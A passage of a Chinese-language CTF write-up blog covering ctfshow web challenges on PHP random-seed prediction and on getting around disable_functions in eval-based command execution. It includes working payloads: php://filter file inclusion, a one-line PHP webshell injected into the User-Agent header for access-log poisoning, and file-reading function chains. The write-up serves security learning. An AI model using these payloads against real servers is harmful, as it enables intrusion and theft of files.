class="variable">$i</span>.<span class="string">&apos;md5&apos;</span>.<span class="variable">$token</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>&#x6211;&#x662F;&#x74DC;&#x5A03;&#x5B50;&#xFF0C;&#x6BCF;&#x6B21;&#x8FD0;&#x884C;PHP&#x8BB0;&#x5F97;&#x5F00;&#x5C0F;&#x76AE;&#xFF0C;&#x7136;&#x540E;&#x6587;&#x4EF6;&#x683C;&#x5F0F;&#x8981;&#x52A0;&#x540E;&#x7F00;<code>.php</code>&#xFF0C;&#x4E0D;&#x7136;&#x5199;&#x5B8C;&#x4E86;&#x5C31;&#x662F;&#x4E00;&#x4E32;HTML&#x4EE3;&#x7801;&#x3002;&#x3002;&#x53C8;&#x4E0D;&#x80FD;&#x6267;&#x884C;&#xFF0C;&#x65E0;&#x8BED;&#x8FBD;</p>
<p>&#x4E24;&#x4E2A;&#x6761;&#x4EF6;&#x90FD;&#x662F;&#x590D;&#x5236;&#x7684;&#x9898;&#x76EE;&#x4E0A;&#x9762;&#x7684;(<strong>&#x53EA;&#x8981;&#x6EE1;&#x8DB3;if&#x8BED;&#x53E5;&#x5C31;&#x53EF;&#x4EE5;&#x8FD4;&#x56DE;&#x6240;&#x9700;&#x8981;&#x7684;flag&#xFF0C;&#x8FD9;&#x91CC;&#x5C31;&#x662F;&#x8BA9;&#x6211;&#x4EEC;&#x627E;&#x5230;&#x4E00;&#x4E2A;token&#x80FD;&#x6EE1;&#x8DB3;&#x8FD9;&#x4E24;&#x4E2A;&#x6761;&#x4EF6;&#xFF0C;&#x5728;&#x672C;&#x5730;&#x91CC;&#x9762;&#x8FD0;&#x884C;&#x627E;&#x5230;&#x4E86;&#x8FD9;&#x4E2A;token&#xFF0C;&#x7136;&#x540E;&#x5728;&#x9898;&#x76EE;&#x7684;url&#x91CC;&#x9762;&#x52A0;&#x4E0A;&#x8BD5;&#x8BD5;&#x770B;&#x5C31;&#x597D;&#x4E86;</strong>)</p>
<p>&#x672C;&#x5730;&#x8DD1;&#x51FA;&#x6765;&#x8FD4;&#x56DE;&#x4E86;&#x4E24;&#x4E2A;token&#xFF1A;<code>1202</code>,<code>422</code></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?token=1202</span><br><span class="line">?token=422s</span><br></pre></td></tr></table></div></figure>

<p>//&#x5C31;&#x662F;&#x8FD9;&#x4E9B;&#x5185;&#x5BB9;&#xFF0C;&#x8FD8;&#x662F;php&#x597D;&#xFF0C;Python&#x8FD8;&#x662F;&#x6572;&#x5C11;&#x4E86;&#xFF0C;&#x770B;&#x811A;&#x672C;&#x597D;&#x4E0D;&#x4E60;&#x60EF;</p>
<hr>

        <h2 id="24">
          <a href="#24" class="heading-link"><i class="fas fa-link"></i></a><a href="#24" class="headerlink" title="24"></a>24</h2>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&apos;r&apos;</span>])){</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&apos;r&apos;</span>];</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="number">372619038</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>())){</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    }</span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&apos;cat /proc/version&apos;</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> Linux version <span class="number">5.4</span>.<span class="number">0</span>-<span class="number">110</span>-<span class="title function_ invoke__">generic</span> (buildd@ubuntu) (gcc version <span class="number">9.4</span>.<span class="number">0</span> (Ubuntu <span class="number">9.4</span>.<span class="number">0</span>-<span class="number">1</span>ubuntu1~<span class="number">20.04</span>.<span class="number">1</span>)) <span class="comment">#124-Ubuntu SMP Thu Apr 14 19:46:19 UTC 2022 Linux version 5.4.0-110-generic (buildd@ubuntu) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #124-Ubuntu SMP Thu Apr 14 19:46:19 UTC 2022</span></span><br></pre></td></tr></table></div></figure>

<p>&#x8003;&#x5BDF;&#x968F;&#x673A;&#x6570;&#x79CD;&#x5B50;&#x51FD;&#x6570;<code>mt_srand</code></p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="number">372619038</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>



<p>&#x7136;&#x540E;&#x54E6;&#x8FD9;&#x4E2A;&#x51FD;&#x6570;php&#x7248;&#x672C;&#x4E0D;&#x540C;&#xFF0C;&#x90A3;&#x4E2A;&#x968F;&#x673A;&#x503C;&#x4E5F;&#x4E0D;&#x540C;&#xFF08;&#x539F;&#x6765;&#x5C0F;&#x76AE;&#x53EF;&#x4EE5;&#x5207;&#x6362;php&#x7248;&#x672C;&#x3002;&#x3002;&#xFF09;</p>

        <h2 id="25">
          <a href="#25" class="heading-link"><i class="fas fa-link"></i></a><a href="#25" class="headerlink" title="25"></a>25</h2>
      <p>&#x8003;&#x70B9;&#xFF1A;&#x77E5;&#x9053;&#x968F;&#x673A;&#x6570;&#x5E8F;&#x5217;&#x7684;&#x67D0;&#x4E2A;&#x503C;&#xFF0C;&#x518D;&#x6765;&#x53CD;&#x63A8;&#x79CD;&#x5B50;&#xFF08;&#x4E0D;&#x505A;&#x4E86;&#x3002;&#x3002;&#x5E0C;&#x671B;&#x4E0B;&#x4E00;&#x6B21;&#x6253;&#x5F00;&#x4E0D;&#x4F1A;&#x662F;&#x5F88;&#x8FDC;&#x7684;&#x5C06;&#x6765;&#xFF09;</p>
<p>Mersenne Twister&#x7B97;&#x6CD5;&#x8BD1;&#x4E3A;&#x9A6C;&#x7279;&#x8D5B;&#x7279;&#x65CB;&#x8F6C;&#x6F14;&#x7B97;&#x6CD5;<code>mt_rand(min,max)</code>,<code>mt_sarnd(seed)</code>&#x540E;&#x9762;&#x90A3;&#x4E2A;&#x51FD;&#x6570;&#x9700;&#x8981;&#x4F20;&#x5165;seed,&#x524D;&#x9762;&#x90A3;&#x4E2A;&#x53C2;&#x6570;&#x975E;&#x5FC5;&#x9700;&#xFF08;&#x4ECE; PHP 4.2.0 &#x7248;&#x5F00;&#x59CB;&#xFF0C;<em>seed</em> &#x53C2;&#x6570;&#x53D8;&#x4E3A;&#x53EF;&#x9009;&#x9879;&#xFF0C;&#x5F53;&#x8BE5;&#x9879;&#x4E3A;&#x7A7A;&#x65F6;&#xFF0C;&#x4F1A;&#x88AB;&#x8BBE;&#x4E3A;&#x968F;&#x65F6;&#x6570;&#x3002;&#xFF09;</p>
<hr>
<p>&#x8BB0;&#x5F55;&#x4E00;&#x4E0B;&#xFF0C;&#x8FD9;&#x91CC;&#x7684;&#x5DE5;&#x5177;<code>php_mt</code>:&#x5148;&#x7528;make &#x547D;&#x4EE4;&#x5728;kali&#x91CC;&#x9762;&#x7F16;&#x8BD1;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x4F7F;&#x7528;</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time ./php_mt_seed 31377665</span><br></pre></td></tr></table></div></figure>

<p>&#x7136;&#x540E;&#x5C31;&#x4F1A;&#x6267;&#x884C;&#x811A;&#x672C;&#xFF0C;&#x597D;&#x4E86;&#x7535;&#x8111;&#x98CE;&#x6247;&#x54CD;&#x8D77;&#x6765;&#x4E86;&#xFF0C;&#x8FD8;&#x8981;&#x6293;&#x5305;&#x770B;&#x7248;&#x672C;</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x5F97;&#x5230;&#x7684;&#x6570;&#x662F;&#xFF1A;</span><br><span class="line">1787727109</span><br><span class="line">2652993265</span><br><span class="line">2882528156</span><br></pre></td></tr></table></div></figure>

<p>&#x7136;&#x540E;&#x8BD5;&#x4E00;&#x8BD5;&#x53BB;&#x6267;&#x884C;</p>
<p><img src="/2022/06/20/6-20/6-20/web25" alt="1657559109388"></p>
<p>&#x627E;&#x5230;&#x7684;&#x4E09;&#x4E2A;&#x91CC;&#x7684;&#x7B2C;&#x4E8C;&#x4E2A;&#x7528;</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">1787727109</span>);</span><br><span class="line"><span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>&#x5F97;&#x5230;&#x7684;token&#x624D;&#x80FD;&#x5F97;&#x5230;flag</p>
<p>&#xFF08;&#x591A;&#x7BC7;&#x535A;&#x5BA2;&#x5F3A;&#x8C03;&#x8981;&#x6CE8;&#x610F;&#x8FC7;&#x7B2C;&#x4E00;&#x4E2A;if&#x8BED;&#x53E5;&#x7684;&#x5224;&#x65AD;&#xFF0C;&#x8BA9;$rand&#x7B49;&#x4E8E;&#x96F6;&#x5C31;&#x884C;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;$r&#x9700;&#x8981;&#x6210;&#x4E3A;&#x76F8;&#x53CD;&#x6570;&#xFF09;</p>
<p>&#x5C06;token&#x653E;&#x8FDB;cookie&#x91CC;&#x9762;&#x5C31;&#x597D;&#x4E86;</p>
<p>&#x9760;&#x8FD0;&#x6C14;&#x662F;&#x51FA;&#x6765;&#x7684;</p>

        <h2 id="26">
          <a href="#26" class="heading-link"><i class="fas fa-link"></i></a><a href="#26" class="headerlink" title="26"></a>26</h2>
      <p>&#x4E00;&#x79CD;&#x662F;&#x4F7F;&#x7528;&#x7206;&#x7834;&#xFF1B;</p>
<p>&#x4E00;&#x79CD;&#x662F;&#x67E5;&#x770B;js&#x6E90;&#x7801;&#xFF0C;&#x53D1;&#x73B0;&#x6709;<code>checkdb.php</code>&#x548C;post&#x7684;&#x65B9;&#x5F0F;</p>
<p>&#x4F7F;&#x7528;</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">get&#xFF1A;</span><br><span class="line">/checkdb.php</span><br><span class="line">post:</span><br><span class="line">a=&amp;p=&amp;d=&amp;u=&amp;pass=</span><br></pre></td></tr></table></div></figure>

<p>&#x4E5F;&#x53EF;&#x4EE5;&#x5F97;&#x5230;flag,&#x597D;&#x602A;&#x54E6;</p>

        <h2 id="27">
          <a href="#27" class="heading-link"><i class="fas fa-link"></i></a><a href="#27" class="headerlink" title="27"></a>27</h2>
      <p>&#x7206;&#x4E0D;&#x51FA;&#x6765;&#x3002;&#x3002;</p>
<p>&#x4F7F;&#x7528;&#x7684;&#x662F;intruder&#x7684;date&#x65B9;&#x5F0F;&#xFF0C;&#x7528;&#x6765;&#x7206;&#x7834;&#x65E5;&#x671F;&#x7684;</p>
<hr>
<p>&#x4F46;&#x662F;&#x89C6;&#x9891;&#x91CC;&#x9762;&#x8BF4;&#x7684;&#x6709;&#x4E2A;&#x7206;&#x8EAB;&#x4EFD;&#x8BC1;&#x7684;&#x811A;&#x672C;&#xFF0C;&#x611F;&#x89C9;&#x5F88;&#x6709;&#x7528;&#x7684;&#x6837;&#x5B50;&#xFF0C;&#x4E3B;&#x8981;&#x662F;&#x953B;&#x70BC;&#x5199;php&#x7684;&#x80FD;&#x529B;</p>
<p>&#x811A;&#x672C;&#x6284;&#x5B8C;&#x4E86;&#xFF0C;&#x7136;&#x540E;&#x51FA;&#x73B0;&#x4E86;&#x751F;&#x65E5;&#x6708;&#x4EFD;&#x4E0E;32&#x5929;&#x7684;&#x8EAB;&#x4EFD;&#x8BC1;&#x53F7;&#x7801;&#x3002;&#x3002;&#x4ECA;&#x5929;&#x5565;&#x90FD;&#x6CA1;&#x505A;&#x51FA;&#x51FA;&#x6765;</p>

        <h2 id="28">
          <a href="#28" class="heading-link"><i class="fas fa-link"></i></a><a href="#28" class="headerlink" title="28"></a>28</h2>
      <p>&#x9664;&#x4E86;&#x65E0;&#x8BED;&#x8FD8;&#x662F;&#x65E0;&#x8BED;&#xFF0C;&#x9760;&#x522B;&#x4EBA;&#x7684;wp&#x627E;&#x5230;payload1=72&#xFF0C;payload2=20&#x627E;&#x5230;flag&#x7684;&#xFF0C;&#x6D6A;&#x8D39;&#x4E00;&#x4E2A;&#x5C0F;&#x65F6;&#x7B49;&#x5B83;&#x7206;&#x7834;&#xFF0C;&#xFF08;&#x660E;&#x660E;&#x5168;&#x662F;503&#xFF0C;771&#x8FD9;&#x90FD;&#x4E00;&#x6837;&#xFF0C;&#x72B6;&#x6001;&#x7801;&#x76F8;&#x540C;&#x7206;&#x4E2A;&#x5BC2;&#x5BDE;&#xFF0C;&#x90A3;&#x4E0D;&#x5982;&#x76F4;&#x63A5;&#x731C;&#xFF09;</p>
<hr>
<p>&#x5220;2.txt,&#x7206;&#x7834;&#x4E24;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;&#x653E;&#x4E24;&#x4E2A;payload&#xFF0C;<code>GET/$1$/$2$/</code>,&#x7528;cluster&#x7206;&#x7834;&#xFF0C;numbers&#x65B9;&#x5F0F;0-100&#xFF0C;step&#x4E3A;1</p>

        <h1 id="ctfshow-web-&#x547D;&#x4EE4;&#x6267;&#x884C;">
          <a href="#ctfshow-web-&#x547D;&#x4EE4;&#x6267;&#x884C;" class="heading-link"><i class="fas fa-link"></i></a><a href="#ctfshow-web-&#x547D;&#x4EE4;&#x6267;&#x884C;" class="headerlink" title="ctfshow web &#x547D;&#x4EE4;&#x6267;&#x884C;"></a>ctfshow web &#x547D;&#x4EE4;&#x6267;&#x884C;</h1>
      
        <h2 id="58">
          <a href="#58" class="heading-link"><i class="fas fa-link"></i></a><a href="#58" class="headerlink" title="58"></a>58</h2>
      <p>&#x6B64;&#x9898;&#x5F00;&#x59CB;&#x7ED5;disable_functions&#x4E86;</p>
<hr>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&apos;c&apos;</span>])){</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&apos;c&apos;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">}</span><br></pre></td></tr></table></div></figure>

<p>&#x8FD9;&#x91CC;&#x53EF;&#x4EE5;&#x5148;&#x7528;&#x5404;&#x79CD;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x7684;&#x51FD;&#x6570;&#x8BD5;&#x8BD5;&#x770B;&#x7981;&#x7528;&#x4E86;&#x54EA;&#x4E9B;&#x51FD;&#x6570;&#xFF0C;&#x56E0;&#x4E3A;&#x4F1A;&#x6709;&#x56DE;&#x663E;&#x3002;</p>
<p>&#x7981;&#x7528;&#x4E86;</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">phpinfo();</span><br><span class="line">shell_exec</span><br><span class="line">system()</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>&#x8BD5;&#x51FA;&#x6765;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>echo file_get_contents(&quot;&quot;)</code>&#x51FD;&#x6570;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x5B98;&#x65B9;wp&#x4E2D;&#x63D0;&#x5230;&#x7684;<code>show_source</code>&#x51FD;&#x6570;</p>

        <h2 id="59">
          <a href="#59" class="heading-link"><i class="fas fa-link"></i></a><a href="#59" class="headerlink" title="59"></a>59</h2>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&apos;c&apos;</span>])){</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&apos;c&apos;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">}</span><br></pre></td></tr></table></div></figure>

<p>&#x8FD9;&#x91CC;&#x7981;&#x7528;&#x4E86;file_get_contents</p>
<p>&#x89C6;&#x9891;&#x91CC;&#x4F7F;&#x7528;&#x7684;&#x662F;&#x5148;&#x7528;POST&#x4E2D;include&#x4E00;&#x4E2A;GET&#x547D;&#x4EE4;&#xFF0C;&#x518D;&#x4F7F;&#x7528;PHP&#x4F2A;&#x534F;&#x8BAE;&#x5728;GET&#x4E2D;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST&#xFF1A;</span><br><span class="line">c=include($_GET[1]);</span><br><span class="line">GET:</span><br><span class="line">?1=php://filter/convert.base64-encode/resource=flag.php</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>


        <h2 id="60">
          <a href="#60" class="heading-link"><i class="fas fa-link"></i></a><a href="#60" class="headerlink" title="60"></a>60</h2>
      <p>&#x7528;<code>show_source</code>&#x4E5F;&#x53EF;&#x4EE5;&#x62FF;&#x5230;flag</p>
<p>&#x89C6;&#x9891;&#x8BB2;&#x4E86;&#x7528;&#x6587;&#x4EF6;&#x5305;&#x542B;&#xFF0C;&#x5199;&#x4E00;&#x53E5;&#x8BDD;&#x6728;&#x9A6C;&#x8FDB;&#x5165;UA&#x5934;&#x91CC;&#x9762;&#xFF0C;&#x518D;&#x6765;&#x62FF;shell&#xFF0C;&#x4E0D;&#x8FC7;&#x7531;&#x4E8E;&#x7981;&#x7528;&#x7684;&#x4E86;system&#x51FD;&#x6570;&#xFF0C;&#x89C6;&#x9891;&#x6CA1;&#x6709;&#x8BB2;&#x7528;&#x4EC0;&#x4E48;&#x529E;&#x6CD5;&#x62FF;shell,&#x4E0D;&#x8FC7;&#x672C;&#x6765;&#x5C31;&#x53EF;&#x4EE5;&#x5728;POST&#x91CC;&#x9762;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x4E5F;&#x8BB8;&#x4E5F;&#x6CA1;&#x6709;&#x54E6;&#x5FC5;&#x8981;&#xFF1F;&#x4E0D;&#x8FC7;&#x662F;&#x4F7F;&#x7528;&#x4E86;<code>highlight_file</code>&#xFF0C;&#x8BFB;&#x53D6;flag.php&#x5373;&#x53EF;</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">UA&#x5934;&#xFF1A;</span><br><span class="line">&lt;?php eval($_POST[a]);?&gt;</span><br><span class="line">&#x5199;&#x5165;&#x540E;&#x5173;&#x95ED;</span><br><span class="line">&#x518D;&#x5728;POST&#x91CC;&#x9762;&#x4F20;&#x53C2;&#xFF1A;</span><br><span class="line">c=include($_GET[1]);&amp;a=highlight_file(&quot;fleg.php&quot;);</span><br><span class="line">&#x540C;&#x65F6;&#x5728;GET&#x91CC;&#x9762;&#x4F20;&#x53C2;:</span><br><span class="line">?a=/var/log/nginx/access.log</span><br></pre></td></tr></table></div></figure>





<hr>
<p>&#x4ECE;58&#x5F00;&#x59CB;feng&#x5E08;&#x5085;&#x7ED9;&#x4E86;&#x51E0;&#x4E2A;&#x8BFB;&#x6587;&#x4EF6;&#x7684;&#x51FD;&#x6570;</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents()</span><br><span class="line">highlight_file()</span><br><span class="line">show_source()</span><br><span class="line">fgets()</span><br><span class="line">file()</span><br><span class="line">readfile()</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>&#x4F7F;&#x7528;fget&#x51FD;&#x6570;&#x65F6;&#x9700;&#x8981;&#x6CE8;&#x610F;&#xFF1A;</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c=</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$b</span>=<span class="title function_ invoke__">fgets</span>(<span class="variable">$a</span>)){</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></div></figure>

<p>&#x4E0D;&#x8FC7;&#x8FD9;&#x4E2A;60&#x7684;fgets&#x88AB;&#x7981;&#x7528;&#x4E86;</p>
<p>&#x566B;&#x5401;&#x56B1;&#xFF0C;&#x8FD8;&#x6709;&#x4E00;&#x4E9B;&#x8BFB;&#x6587;&#x4EF6;&#x7684;&#x65B9;&#x5F0F;&#xFF1A;</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fgets</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span>(!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)){<span class="variable">$line</span>=<span class="title function_ invoke__">fgets</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>};</span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fgets</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span>(!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)){<span class="variable">$line</span>=<span class="title function_ invoke__">fgetc</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>};</span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fgets</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span>(!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)){<span class="variable">$line</span>=<span class="title function_ invoke__">fgetcsv</span>(<span class="variable">$a</span>);<span class="title function_ invoke__">print_r</span>(<span class="variable">$line</span>)};</span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fgets</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">echo</span> <span class="title function_ invoke__">fread</span>(<span class="variable">$a</span>,<span class="string">&quot;1000&quot;</span>);</span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fgets</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="title function_ invoke__">fpassthru</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></div></figure>

<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.fgetcsv() &#x51FD;&#x6570;&#x4ECE;&#x6587;&#x4EF6;&#x6307;&#x9488;&#x4E2D;&#x8BFB;&#x5165;&#x4E00;&#x884C;&#x5E76;&#x89E3;&#x6790; CSV &#x5B57;&#x6BB5;&#x3002;fgetcsv() &#x51FD;&#x6570;&#x4ECE;&#x6587;&#x4EF6;&#x6307;&#x9488;&#x4E2D;&#x8BFB;&#x5165;&#x4E00;&#x884C;&#x5E76;&#x89E3;&#x6790; CSV &#x5B57;&#x6BB5;&#x3002;</span><br><span class="line">fgetcsv(file,length,separator,enclosure)</span><br><span class="line"></span><br><span class="line">2.fread(file,length)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3.fpassthru() &#x51FD;&#x6570;&#x8F93;&#x51FA;&#x6587;&#x4EF6;&#x6307;&#x9488;&#x5904;&#x7684;&#x6240;&#x6709;&#x5269;&#x4F59;&#x6570;&#x636E;&#x3002;</span><br><span class="line">&#x8BE5;&#x51FD;&#x6570;&#x5C06;&#x7ED9;&#x5B9A;&#x7684;&#x6587;&#x4EF6;&#x6307;&#x9488;&#x4ECE;&#x5F53;&#x524D;&#x7684;&#x4F4D;&#x7F6E;&#x8BFB;&#x53D6;&#x5230; EOF&#xFF0C;&#x5E76;&#x628A;&#x7ED3;&#x679C;&#x5199;&#x5230;&#x8F93;&#x51FA;&#x7F13;&#x51B2;&#x533A;&#x3002;</span><br><span class="line">fpassthru(file)</span><br></pre></td></tr></table></div></figure>


        <h2 id="61">
          <a href="#61" class="heading-link"><i class="fas fa-link"></i></a><a href="#61" class="headerlink" title="61"></a>61</h2>
      <p>&#x540C;&#x7406;</p>
<hr>
<p>feng&#x5E08;&#x5085;&#x7684;&#x4ECB;&#x7ECD;</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//&#x901A;&#x8FC7;&#x590D;&#x5236;&#xFF0C;&#x91CD;&#x547D;&#x540D;&#x8BFB;&#x53D6;php&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#xFF08;&#x51FD;&#x6570;&#x6267;&#x884C;&#x540E;&#xFF0C;&#x8BBF;&#x95EE;url/flag.txt&#xFF09;</span><br><span class="line">copy()</span><br><span class="line">rename()</span><br><span class="line">//&#x7528;&#x6CD5;&#xFF1A;</span><br><span class="line">copy(&quot;flag.php&quot;,&quot;flag.txt&quot;);            </span><br><span class="line">rename(&quot;flag.php&quot;,&quot;flag.txt&quot;);           </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>&#x829C;&#x6E56;&#xFF0C;62&#x9898;&#x88AB;&#x7981;&#x4E86;&#x8FD9;&#x4E24;&#x4E2A;&#x51FD;&#x6570;&#xFF0C;&#x61D2;&#x5F97;&#x5F00;&#x73AF;&#x5883;&#x4E86;&#x3002;&#x3002;</p>

